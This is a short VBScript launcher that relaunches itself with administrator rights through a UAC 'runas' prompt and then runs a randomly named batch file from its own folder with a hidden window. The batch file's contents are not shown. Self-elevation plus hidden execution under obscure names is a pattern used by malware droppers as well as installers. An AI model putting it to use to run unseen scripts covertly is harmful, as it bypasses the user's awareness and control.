If Not WScript.Arguments.Named.Exists("u886770") Then
	Set sh = CreateObject("Shell.Application")
	sh.ShellExecute "wscript.exe", _
	"""" & WScript.ScriptFullName & """ /u886770", _
	"", _
	"runas", _
	1
	WScript.Quit
End If
Set fs = CreateObject("Scripting.FileSystemObject")
pp = fs.GetParentFolderName(WScript.ScriptFullName)
fp = pp & "\u411638.bat"
If fs.FileExists(fp) Then
	Set wshl = CreateObject("WScript.Shell")
	wshl.Run "cmd.exe /c " & _
	"""" & fp & """", _
	0
End If